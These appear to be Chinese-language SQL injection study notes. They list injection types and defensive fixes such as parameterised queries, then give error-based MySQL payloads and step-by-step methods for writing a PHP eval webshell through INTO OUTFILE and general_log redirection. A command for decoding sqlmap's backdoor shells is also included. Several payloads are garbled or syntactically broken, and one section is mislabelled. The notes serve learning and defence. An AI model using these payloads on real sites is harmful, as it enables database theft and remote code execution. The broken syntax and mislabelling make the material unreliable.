## SQL注入分类

基于参数型：数字型注入、字符型注入

基于位置型：GET、POST、Cookie、其他注入（HTTP请求其他内容触发的SQL漏洞）

基于反馈型：盲注（时间盲注、布尔盲注）、非盲注（正常SQL注入）

其他类型：延时注入、搜索注入、编码注入、 堆叠注入、联合查询注入、多阶注入



## SQL注入原理和修复方法

原理：Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

修复方法：

代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。

　　（1）**使用预编译语句**，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。

　　（2）**对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换**。

　　（3）**确认每种数据的类型**，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。

　　（4）**数据长度应该严格规定**，能在一定程度上防止比较长的SQL注入语句无法正确执行。

　　（5）**网站每个数据层的编码统一**，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。

　　（6）**严格限制网站用户的数据库的操作权限**，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。

　　（7）**避免网站显示SQL错误信息**，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。

　　（8）**过滤危险字符**，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。



## SQL报错注入函数

1、通过floor报错,注入语句如下:  

```
and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

2、通过ExtractValue报错,注入语句如下:

```
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
```

3、通过UpdateXml报错,注入语句如下:

```
and 1=(updatexml(1,concat(0x3a,(selectuser())),1))
```

4、通过NAME_CONST报错,注入语句如下:

```
and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
```

5、通过join报错,注入语句如下:

```
select * from(select * from mysql.user ajoin mysql.user b)c;
```

6、通过exp报错,注入语句如下:

```
and exp(~(select * from (select user () ) a) );
```

7、通过GeometryCollection()报错,注入语句如下:

```
and GeometryCollection(()select *from(select user () )a)b );
```

8、通过polygon ()报错,注入语句如下:

```
and polygon (()select * from(select user ())a)b );
```

9、通过multipoint ()报错,注入语句如下:

```
and multipoint (()select * from(select user() )a)b );
```

10、通过multlinestring ()报错,注入语句如下:

```
and multlinestring (()select * from(selectuser () )a)b );
```

11、通过multpolygon ()报错,注入语句如下:

```
and multpolygon (()select * from(selectuser () )a)b );
```

12、通过linestring ()报错,注入语句如下:

```
and linestring (()select * from(select user() )a)b );
```



## SQL绕过WAF思路

https://www.cnblogs.com/cute-puli/p/11146625.html



## SQL注入写webshell的几种方法

**1、利用Union select 写入**

这是最常见的写入方式，`union` 跟`select into outfile`，将一句话写入`evil.php`，仅适用于联合注入。

具体权限要求：`secure_file_priv`支持`web`目录文件导出、数据库用户File权限、获取物理路径。

```
?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'
?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"
```

**2、利用分隔符写入**

当`Mysql`注入点为盲注或报错，`Union select`写入的方式显然是利用不了的，那么可以通过分隔符写入。`SQLMAP`的 `--os-shell`命令，所采用的就是一下这种方式。

具体权限要求：`secure_file_priv`支持`web`目录文件导出、数据库用户`File`权限、获取物理路径。

```
?id=1 LIMIT 0,1 INTO OUTFILE 'E:/study/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
```

同样的技巧，一共有四种形式：

```
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
```

**3、利用log写入**

新版本的`MySQL`设置了导出文件的路径，很难在获取`Webshell`过程中去修改配置文件，无法通过使用`select into outfile`来写入一句话。这时，我们可以通过修改`MySQL`的`log`文件来获取`Webshell`。

具体权限要求：数据库用户需具备`Super`和`File`服务器权限、获取物理路径。

```
show variables like '%general%';             #查看配置
set global general_log = on;                 #开启general log模式
set global general_log_file = 'E:/study/WWW/evil.php'; #设置日志目录为shell地址
select '<?php eval($_GET[g]);?>'             #写入shell
set global general_log=off;                  #关闭general log模式
```



## SQL注入无回显情况下的利用方法，以及对于mysql和mssql的详细利用函数





## sqlmap写osshell的过程

进入/usr/share/sqlmap/shell目录，可以看到readme.txt，里面大致是讲shell都是加密的，里面最下面两句就是加密和解密的

进入到sqlmap文件夹下执行

find backdoor.* stager.* -type f -exec python ../extra/cloak/cloak.py -i '{}' \;

我们就会看到解密出来的文件了，自定义之后再加密就可以了。



## 时间盲注用到的函数

sleep函数、配合if语句触发、截取函数（substring()和substr()）、配合select            case when条件触发、逐字注入、BENCHMARK（count,expr）、GET_LOCK(str、timeout)、RLIKE

https://www.dazhuanlan.com/2020/03/01/5e5a91d69b124/?__cf_chl_jschl_tk__=d17f380a866d8c565de9d746be9051fd05603a5e-1601341790-0-AexQN90rwBSMARY5S7kN6DedcaqgdPPKW2m7Qt0AFPhHZgcQDRGKyT9lGfyfXOl7MdzDcTugs2y-rJeRCiZLrtGacqw13cv6z4pWx6wt76VTKvo1NN7ZMHdhSoiOETKTx-x95WT8GsByMYnWByWuZPS4VR0xuKexgwr9BMFrlrEN7dhXFP024p3LqjOfb8WTy2mRUVjcl7j3ekEa881A_n07ldFelHySoXPfl_SXVcdF-rWl31aksSay_9r21AXwK-7N_u7HHKqHbhs9i_OEuVA1ZBcvSn9tOSbcNDiCDLnz8H_B5twX7pjhe0PKzgFwEw



## windows和linux操作系统的延时函数是什么

windows：Sleep()，毫秒为单位

Linux：sleep()，秒为单位，sleep的实现是由pause函数和alarm函数两个实现的，usleep()单位是微秒

## mysql文件操作函数

返回字符串左边一定长度n的字符：elect LEFT(‘china’,2);

返回字符串的长度：select LENGTH(‘china’);

划出字符串的一个字串：select LOCATE(‘n’,’china’[,5]);

将字符串转为小写：select LOWER(‘CHINA’);

去掉字符串左、右、两边的空格：select ’ CHINA ‘, LTRIM(’ CHINA ‘),RTRIM(’ CHINA ‘),TRIM(’ CHINA ‘);

返回字符串右边一定长度n的字符：select RIGHT(‘CHINA’,3);

返回字符串的SOUNDEX值，soundex是一个将任何文本字符串转换为描述其语音表示的字母数字模式的算法。
下文使用soundex函数进行搜索，它匹配所有发音类似于Y.Lie的联系名。
Y.Lie和Y.Lee发音相似，经soundex函数转换后，cust_contact的soundex值和搜索串的soundex值匹配。

select cust_name,cust_contact
from customers
where SOUNDEX(cust_contact) = soundex(‘Y Lie’);



